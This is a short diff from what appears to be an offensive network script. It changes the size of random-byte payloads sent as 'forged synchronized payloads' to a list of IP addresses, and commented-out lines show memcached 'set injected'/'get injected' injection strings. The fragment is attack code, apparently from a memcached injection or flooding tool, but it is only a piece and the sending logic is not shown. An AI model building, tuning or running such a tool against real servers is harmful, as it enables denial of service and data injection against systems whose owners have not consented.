@@ -54,8 +54,8 @@ while True:
            #     setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
            #     getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
            #     p/rint("[+] Payload transformed: ", dataset)
-        setdata = random._urandom(65813)
-        getdata = random._urandom(65813)
+        setdata = random._urandom(9048)
+        getdata = random._urandom(9048)
         counter= int(0)
         for i in ip_array:
             print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
